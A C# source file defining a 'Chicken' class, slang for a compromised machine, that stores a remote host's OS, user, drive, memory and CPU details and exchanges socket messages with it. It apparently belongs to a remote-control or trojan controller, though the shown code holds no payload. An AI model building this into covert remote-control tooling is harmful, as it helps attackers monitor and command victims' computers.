/******************************************
 * 版权所有jackch
 * QQ:106050555
 * E-mail:jackch88@hotmail.com
 * 个人Blog:http://www.jackch.cn
 * CSDN_Blog:http://blog.csdn.net/jackch88/
 * ****************************************/
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Text;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using Microsoft.Win32;
using System.Collections;
using System.Windows.Forms;

namespace Jackch
{
    public class Chicken
    {
        private Socket socket;//socket套接字
        private IPAddress ip;//远程主机IP
        private string oSName;//远程主机操作系统
        private string computerName;//远程主机机器名称
        private string userName;//远程主机当前用户
        private string paths;//远程主机环境变量
        private string drive;//远程主机磁盘信息
        private string memory;//远程主机内存信息
        private string screens;//远程主机显示器信息
        private string cpu;//远程主机CPU信息
        private string address = "未知";//远程主机地理位置

        /// <summary>
        /// 构照函数
        /// </summary>
        public Chicken()
        {
            socket = null;
            ip = null;
        }
        public Chicken(Socket socket,IPAddress ip)
        {
            this.socket = socket;
            this.ip = ip;
        }
        /// <summary>
        /// 获取服务端IP
        /// </summary>
        public IPAddress IP
        {
            get
            {
                return ip;
            }
        }
        public string OSName
        {
            get
            {
                return oSName;
            }
            set
            {
                oSName = value;
            }
        }
        public string ComputerName
        {
            get
            {
                return computerName;
            }
            set
            {
                computerName = value;
            }
        }
        public string UserName
        {
            get
            {
                return userName;
            }
            set
            {
                userName = value;
            }
        }
        public string Paths
        {
            get
            {
                return paths;
            }
            set
            {
                paths = value;
            }
        }
        public string Drive
        {
            get
            {
                return drive;
            }
            set
            {
                drive = value;
            }
        }
        public string Memory
        {
            get
            {
                return memory;
            }
            set
            {
                memory = value;
            }
        }
        public string Screens
        {
            get
            {
                return screens;
            }
            set
            {
                screens = value;
            }
        }
        public string Cpu
        {
            get
            {
                return cpu;
            }
            set
            {
                cpu = value;
            }
        }
        public string Address
        {
            get
            {
                return address;
            }
            set
            {
                address = value;
            }
        }
        /// <summary>
        /// 判断是否连接服务端
        /// </summary>
        /// <returns></returns>
        public bool Connected()
        {
            return WriteToServer("Connected");
        }
        /// <summary>
        /// 关闭连接
        /// </summary>
        public void Close()
        {
            socket.Close();
        }
        /// <summary>
        /// 向服务端发送消息
        /// </summary>
        /// <param name="socket"></param>
        /// <param name="SendMessage"></param>
        public bool WriteToServer(string SendMessage)
        {
            string sendMsg = SendMessage + "\r\n";
            byte[] ToSend = System.Text.Encoding.UTF8.GetBytes(sendMsg.ToCharArray());
            try
            {
                socket.Send(ToSend);
                return true;
            }
            catch
            {
                return false;
            }
        }
        /// <summary>
        /// 读取服务端发送的信息
        /// </summary>
        /// <returns></returns>
        private bool CanRead = true;
        public string ReadFromServer( out bool isConnected)
        {
            while (!CanRead)
            {
                Thread.Sleep(1000);
            }
            CanRead = false;
            isConnected = true;
            string str = "";
            byte[] byteMessage = new byte[1024];
            try
            {
                int n = socket.Receive(byteMessage);
                while (n > 0)
                {
                    string ss = System.Text.Encoding.UTF8.GetString(byteMessage, 0, n);
                    int x = ss.IndexOf("<EOF>");
                    if (x != -1)
                    {
                        str += ss.Substring(0, x);
                        break;
                    }
                    else
                    {
                        str += ss;
                    }
                    byteMessage = new byte[1024];
                    n = socket.Receive(byteMessage);
                }
            }
            catch
            { 
                isConnected = false; 
            }
            CanRead = true;
            return str;
        }
    }
}


